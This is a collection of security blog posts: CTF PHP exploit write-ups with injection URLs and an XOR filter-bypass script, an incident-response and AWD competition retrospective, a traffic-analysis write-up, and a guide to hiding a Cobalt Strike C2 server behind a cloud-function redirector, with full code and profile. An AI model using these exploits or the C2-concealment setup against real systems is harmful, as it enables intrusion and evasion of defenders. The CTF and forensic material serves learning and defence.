title="挖矿"></a>挖矿</h2><p>web就那么几道题我是妹想到的，我以为后面还会放题，专门问了主办方，主办方说一次放完，好吧，那估计是要在其他地方找patch点了。top看了一下，有一个进程的cpu利用率过高，在/home/ctf/mxxx目录下（具体目录名称记不清了）是一个elf文件，同目录下还有json的配置文件，直觉告诉我是挖矿。挖矿程序常在tmp目录写点东西，这里的操作就是首先干掉挖矿进程，然后删掉挖矿程序以及tmp目录下对应的内容，然后查看crontab防止再次下载与自启动。</p><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>crontab这题我应该是妹做出来，异常点是ctf用户的crontab，我是root用户。看了 /var/spool/cron/crontabs没看到啥东西,就没在看。赛后师傅说了下 crontab -user -l 也可以看指定用户的crontab。。学到了</p><h2 id="外连socket"><a href="#外连socket" class="headerlink" title="外连socket"></a>外连socket</h2><p>netstat -antlp 之后发现有向9999端口外连的行为，然后ps aux 和ps ef 之后看到了命令类似 sh -c python3 -c “__import__(‘os’).system(‘xxxxxx’)”。可以确定是这些进程建立了socket连接，但是找不到具体是谁起了这些进程…就很无奈，杀也杀不掉，这里我的处理方法是把python3的软连接给干掉了。因为通过观察进程发现除了这些外连的没有用py3起的进程。这里其实是有个so文件被修改了，后面pwn的队友修复的。</p><h2 id="ssh公钥"><a href="#ssh公钥" class="headerlink" title="ssh公钥"></a>ssh公钥</h2><p>ssh 免密登录存放的公钥在~/.ssh/authorized_keys文件里面，由于我们是私钥登录，但是里面有三个公钥，我们只保留了我们私钥对应的公钥，其他公钥全给删了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次运维赛相对基础，就当温习一下应急响应了。毕竟只正经做过一次：）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>两道简单ctf-php-web题</title>
      <link href="2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/"/>
      <url>2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">String2Array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span> == <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">&quot;\$array = <span class="subst">$data</span>;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$attrid</span>) &amp;&amp; is_array(<span class="variable">$attrvalue</span>))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;array(&#x27;</span>;</span><br><span class="line">        <span class="variable">$attrids</span> = count(<span class="variable">$attrid</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$attrids</span>; <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$attrstr</span> .= <span class="string">&#x27;&quot;&#x27;</span>.intval(<span class="variable">$attrid</span>[<span class="variable">$i</span>]).<span class="string">&#x27;&quot;=&gt;&#x27;</span>.<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$attrvalue</span>[<span class="variable">$i</span>].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$i</span> &lt; <span class="variable">$attrids</span>-<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$attrstr</span> .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String2Array(<span class="variable">$attrstr</span>);</span><br><span class="line">​```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意点：extract可以进行变量覆盖，<span class="keyword">eval</span>那句话是把字符串数组格式转为真正的数组。</span><br><span class="line">exp:</span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=2%22);system(%27whoami%27);//&amp;attrid%5B0%5D=1">http://127.0.0.1/test.io/index.php?attrvalue[0]=2%22);system(%27whoami%27);//&amp;attrid[0]=1</a><br><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=1&amp;attrid%5B0%5D=2&amp;attrstr=phpinfo()">http://127.0.0.1/test.io/index.php?attrvalue[0]=1&amp;attrid[0]=2&amp;attrstr=phpinfo()</a>;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(&#39;0&#39;);</span><br><span class="line">$str1 &#x3D; $_GET[&#39;str1&#39;];</span><br><span class="line">$str2 &#x3D; $_GET[&#39;str2&#39;];</span><br><span class="line">function waf($str)</span><br><span class="line">&#123;</span><br><span class="line">$blacklist&#x3D;&#39;&#x2F;phpinfo|passthru&#x2F;i&#39;;</span><br><span class="line">    if (preg_match($blacklist,$str))</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return  true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function HackMe($str1,$str2)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; &quot;&quot;;</span><br><span class="line">for ($i &#x3D; 0;$i&lt;strlen($str1);$i++)</span><br><span class="line">&#123;</span><br><span class="line">$array1[$i] &#x3D; $str1[$i];</span><br><span class="line">&#125;</span><br><span class="line">for ($b &#x3D; 0;$b&lt;strlen($str2);$b++)</span><br><span class="line">&#123;</span><br><span class="line">$array2[$b] &#x3D; $str2[$b];</span><br><span class="line">&#125;</span><br><span class="line">for ($c&#x3D;0;$c &lt;count($array1);$c++)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; $str.($array1[$c] ^ $array2[$c]);</span><br><span class="line">&#125;</span><br><span class="line">if (strlen($str)&lt;&#x3D;30)</span><br><span class="line">&#123;</span><br><span class="line">if (waf($str))</span><br><span class="line">&#123;</span><br><span class="line">echo $str;</span><br><span class="line">eval($str);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;ohhhhhhhhhhhhhhhhhhhhhhhh you can&#39;t get flag!!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;nonono you are sooooooooo lang~&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HackMe($str1,$str2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目复现时没有waf.php，在比赛的时候需要去fuzz下过滤了哪个字符，所以我这里简单写了些waf的实现，直接写到function里面了。简单的异或，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ava_alpha=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">32</span>&lt;i <span class="keyword">and</span> i&lt;<span class="number">127</span>):</span><br><span class="line">        ava_alpha.append(<span class="built_in">chr</span>(i))</span><br><span class="line">target_str=<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span></span><br><span class="line">res1=<span class="string">&quot;&quot;</span></span><br><span class="line">res2=<span class="string">&quot;&quot;</span></span><br><span class="line">blacklist=[<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Getoutofloop</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(target_str)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ava_alpha:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> ava_alpha:</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))==(target_str[k]) <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> blacklist <span class="keyword">and</span> j <span class="keyword">not</span> <span class="keyword">in</span> blacklist):</span><br><span class="line">                    res1+=<span class="built_in">str</span>(i)</span><br><span class="line">                    res2+=<span class="built_in">str</span>(j)</span><br><span class="line">                    <span class="keyword">raise</span> Getoutofloop()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res1)</span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比较简单的异或，写脚本的时候注意如何跳出所有循环，这里用到了raise exception，可以根据黑名单维护blacklist保证不用blacklist里面的字符生成异或字符。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 云函数隐藏服务器IP</title>
      <link href="2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/"/>
      <url>2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/</url>
      
        <content type="html"><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q">https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q</a></p><p><a href="https://blog.zsec.uk/cobalt-strike-profiles/">https://blog.zsec.uk/cobalt-strike-profiles/</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在红队基础设施建设中，使用云函数可隐藏真实C2的IP地址，当然，这只是其中一种方法，其他方法包括但不限于特征消除、证书修改、CDN、域前置。这些技术会陆续实现。</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>腾讯云注册云函数</p><p>新建函数-自定义创建函数</p><p><img src="http://cdn.polowong.top/image-20211015185512996.png" alt="image-20211015185512996"></p><p>Python模板，python3.6即可，触发方式选择API网关触发</p><p>在函数代码中写入如下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    C2=<span class="string">&#x27;http://&#x27;</span> <span class="comment"># C2 IP地址，这里可以使用 HTTP、HTTPS~下角标~</span></span><br><span class="line">    path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">    headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">        resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.headers)</span><br><span class="line">        <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line">    response=&#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>接下来配置API网关</p><p><img src="http://cdn.polowong.top/image-20211015185830062.png" alt="image-20211015185830062"></p><p>版本选择LATEST，点进去蓝色的链接进行API配置，路径改为根目录</p><p><img src="http://cdn.polowong.top/image-20211015185912831.png" alt="image-20211015185912831"></p><p><img src="http://cdn.polowong.top/image-20211015185921658.png" alt="image-20211015185921658"></p><p>然后下一步，事件函数，版本选择LATEST，一定要勾选响应集成。之后点立即完成就可以了。</p><p>发布服务之后在右边可以看到API的HTTP与HTTPS地址，记住这个有用，当然了，在云函数那也可以看（函数服务-触发管理-访问路径）</p><p><img src="http://cdn.polowong.top/image-20211015190133119.png" alt="image-20211015190133119"></p><h1 id="cobalt-strike配置"><a href="#cobalt-strike配置" class="headerlink" title="cobalt strike配置"></a>cobalt strike配置</h1><p>CS的配置踩大坑。</p><p>首先是编写对应的profile，代码如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">set</span> <span class="string">sample_name</span> <span class="string">&quot;t&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">sleeptime</span> <span class="string">&quot;3000&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">jitter</span>   <span class="string">&quot;0&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">maxdns</span>   <span class="string">&quot;255&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">useragent</span> <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line"><span class="string">http-get</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/x&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">metadata</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;SESSIONID=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Nodejs&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-stager</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x86</span> <span class="string">&quot;/vue.min.js&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x64</span> <span class="string">&quot;/bootstrap-2.min.js&quot;</span><span class="string">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-post</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/y&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">id</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;JSESSION=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写完之后命名为c2.profile，然后用cs目录下的c2lint.sh进行检查，这个东西的作用就是检查编写的profile是否正确。</p><p>c2lint.sh ./c2.profile</p><p><img src="http://cdn.polowong.top/image-20211015190808713.png" alt="image-20211015190808713"></p><p>这样看是没啥问题，然后运行teamserver的时候后面跟上profile就可以了，例如</p><p>./teamserver.sh 1.1.1.1 123456 c2.profile</p><p>这样就可以把profile作为listener的配置。</p><p>启动cs后，添加http listener，HOSTS和STAGER填写如下</p><p><img src="http://cdn.polowong.top/image-20211015191005476.png" alt="image-20211015191005476"></p><p>都是生成的云函数的地址，注意把前面的HTTP：//去掉！！</p><p>保存后，生成EXE，上线。</p><p>然后在victim主机上查看流量，并没有发现C2的IP地址,140开头的地址不是我的地址。</p><p><img src="http://cdn.polowong.top/image-20211015191107942.png" alt="image-20211015191107942"></p><p><img src="http://cdn.polowong.top/image-20211015191253179.png" alt="image-20211015191253179"></p><p>这样就使用云函数实现了C2真实IP的隐藏，在CS中也可以正常使用命令，证明beacon工作无异常。</p><p><img src="http://cdn.polowong.top/image-20211015191425103.png" alt="image-20211015191425103"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 红队技能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绿城杯AWD总结</title>
      <link href="2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/"/>
      <url>2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次打绿城杯代价挺大的，改签机票提前住了一晚宾馆，在高铁站打了一天初赛；进了线下学校不报销路费，来回平均一个人1500块，一共去了四个人。最后的结果是上午CTF一分没拿，下午AWD打到了第九名，总体排名还是没有排到前9，只给了优胜奖。撇去自身实力原因外，我想吐槽组委会：为什么本来说只有AWD结果上午打CTF?说是CTF/AWD分值一比一，是否严格履行？你线下AWD搞个CTF是什么意思？防止PY上午不禁止去厕所，下午AWD却禁止去厕所，谁AWD还有空去PY？消息通知混乱，到了郑州才知道要做核酸，获奖队伍少，奖金少，无现金，只有E卡。我愿称之为全国最穷国家网络安全宣传周活动。<br>下面说我在比赛中返的一些错误。上午CTF，本人菜，没啥好说的。</p><h1 id="致命"><a href="#致命" class="headerlink" title="致命"></a>致命</h1><p>AWD流程环节出现严重问题。赛前演练四个人的配合中都没有演练到文件监控脚本的使用，导致被别人种了不死马掉大分。在监控不到流量、pwn题下线、web一直被打的情况下当时没有想到不死马这个事情，是我疏忽了。上了文件监控脚本后再也没失分。（自动删除不死马及任何新上传的文件，无crontab，这里需要注意的是，<strong>比赛的时候我忘记crontab路径了，只能看当前user，但shell的权限大部分是www-data需要加强记忆</strong>）</p><h1 id="严重"><a href="#严重" class="headerlink" title="严重"></a>严重</h1><p>脚本编写能力过差。当队友通过流量抓取到漏洞利用方式时，经我验证后应该迅速写出批量利用脚本，在这个地方卡住了，导致写脚本写的比较慢，应该是丢掉了许多分数。</p><p>无法自动提交flag。安恒的HTTPS流量不知道为啥抓不到，没有办法用脚本自动提交flag。</p><p>无法进一步利用已知漏洞种植不死马。这导致丢了很多分数</p><p>赛时脚本结构混乱，应将功能点分开，RCE利用和种马应同时尝试进行，利用马getflag的操作应该在另一个文件中。多线程尚未熟练掌握</p><p>AOIAWD赛前未成功部署，仅靠watchbird总是感觉力不从心。</p><h1 id="轻微"><a href="#轻微" class="headerlink" title="轻微"></a>轻微</h1><p>赛时紧张，对待队友的态度有时过激。</p><h1 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h1><p>1.提高脚本编写能力，掌握多线程，优化脚本结构</p><p>2.在AWD演练中尝试使用RCE漏洞种植不死马并getflag。</p><p>3.本地部署AOIAWD</p><p>4.crontab路径熟记，防止有人写crontab。</p><p>5.模拟时严格演练流程，优化分工。</p><p>6.应正确对待队友，克制自己的情绪。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次我有点拉跨，不过队友的表现很好，能各司其职的负责我所分配的认为（流量、赛题监控、备份与恢复、杀毒、流量告警等）我认为我的队友第一次打线下AWD能做到这种程度比我强太多了。下次AWD一定拿下！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Traffic analysis in Lvcheng Cup</title>
      <link href="2021/10/09/Traffic-analysis-in-Lvcheng-Cup/"/>
      <url>2021/10/09/Traffic-analysis-in-Lvcheng-Cup/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Target: <strong>FIND THE FLAG(hint : AntSwort traffic)</strong></p><p>Personally I think this problem is challenging for me,it contains Cobalt Strike traffic analysis, laravel Rce traffic analysis and AntSwort traffic analysis.</p><h1 id="AntSword-and-Laravel-RCE-Traffic-Analysis"><a href="#AntSword-and-Laravel-RCE-Traffic-Analysis" class="headerlink" title="AntSword  and Laravel RCE Traffic  Analysis"></a>AntSword  and Laravel RCE Traffic  Analysis</h1><p>There are many packets in the pcap file,personally I’’ll use http.request.method==POST to filter http traffic beacuse most of webshell are use post method sends data to victims.Obviously there are too many packets contains ignition field, after googling, I found that this is Laravel RCE explotiation. </p><p><img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image"><br>Following figure shows that .config.php were frequently requested ,follow it in HTTP stream, obviously the webshell executed ls command.</p><p><img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image"></p><h2 id="node1"><a href="#node1" class="headerlink" title="node1"></a>node1</h2><p>Keep following requests which connnected to config.php,we can find a pacaket made an extract operation and the file name is secret.zip,this file is suspicious and it should be recovered .After extarcing HTTP objects I haven’t find secret.zip,so keep following  packets.<br><img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image"></p><h2 id="node1-end"><a href="#node1-end" class="headerlink" title="node1 end"></a>node1 end</h2><p>In a packet we find PK filed in response data,so it should be recovered with zip file format.There is one thing to note,in the start and end postions of response data exists hex data,AntSword added it to reduce traffic character.</p><p><img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image"></p><p>Use 010 editor to recover this file ,then open it, but it tips me password are required,now I didn’t find any passwords,after fix ,check and broute tools I still can’t open it.So I have to find the password.We can find that the secret file is .cobaltstrike.beacon_keys file ,it’s serialized file contains public and private key.If we can crack the password and recover private key, the ciphertext between hacker and coblatstrike teamserver will be cracked.</p><p>In <strong>node 1</strong> we find an extract command were executed, so next setp is recover webshell contents and know the exact command, it must contains exact password.The webshell were written by Laravel RCE, so we should find what hacker did via Laravel RCE exploitation.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 